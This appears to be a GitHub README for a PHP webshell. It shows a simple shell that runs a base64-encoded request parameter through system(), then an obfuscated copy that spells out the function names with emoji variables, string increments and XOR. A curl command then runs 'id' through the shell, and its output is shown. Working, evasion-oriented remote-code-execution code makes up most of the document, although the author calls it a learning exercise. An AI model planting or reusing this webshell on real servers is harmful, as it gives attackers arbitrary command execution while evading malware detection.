# php-emoji-webshell

🥸 Nothing new about this webshell, just use same techniques like XOR and self increment operations.

Basically this code
```php
<?php

$a = $_REQUEST[4] ? base64_decode($_REQUEST[4]) : 'whoami';
@system($a);

```
Turn into emoji, self increment and XOR operations.

```php
<?php

$_=[];                      // $_ = [];
$_=@"$_";                   // $_ = "Array";
$__=("_"=="_")+("_"=="_");  // $__ = 1 + 1;
$_=@$_[++$__];              // $_ = $_[3] // "Array"[3]

$🌏=$_++; // a
$🤮=$_++; // b
$🍪=$_++; // c
$🫣=$_++; // d
$🧁=$_++; // e
$🎂=$_++; // f
$🥃=$_++; // g
$🍔=$_++; // h
$🌘=$_++; // i
$🌗=$_++; // j
$🌖=$_++; // k
$🌕=$_++; // l
$🌒=$_++; // m
$🌓=$_++; // n
$🌔=$_++; // o
$🌰=$_++; // p
$🍘=$_++; // q
$🥗=$_++; // r
$🥥=$_++; // s
$🍑=$_++; // t
$🍋=$_++; // u
$🧇=$_++; // v
$🌮=$_++; // w
$🍕=$_++; // x
$🥯=$_++; // y
$🍣=$_;   // z

$__++; // 4
$__++; // 5
$__++; // 6
$👿=$🤮.$🌏.$🥥.$🧁.$__; // base6
$__--; // 5
$__--; // 4
$👿.=$__.("#"^"|").$🫣.$🧁.$🍪.$🌔.$🫣.$🧁; // base64_decode

$💀=$🥥.$🥯.$🥥.$🍑.$🧁.$🌒; // system
$🥳=("#"^"|").($🍘^"#").($🎂^"#").($🥗^"#").($🧇^"#").($🎂^"#").($🌰^"#").($🌮^"#"); // _REQUEST
$🤯=@${$🥳}[$__] ? $👿(@${$🥳}[$__]) : $🌮.$🍔.$🌔.$🌏.$🌒.$🌘; // $_REQUEST[4] ? base64_decode($_REQUEST[4]) : "whoami"
@$💀($🤯); // @system("command")

```

Execute the webshell.

```sh
❯ curl http://127.0.0.1/emoji.php\?4\=`echo id | base64`
uid=501(someone) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),101(access_bpf),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae),701(com.apple.sharepoint.group.1)
```

Im just building this for fun and for the sake of learning new things. ☕️🥯
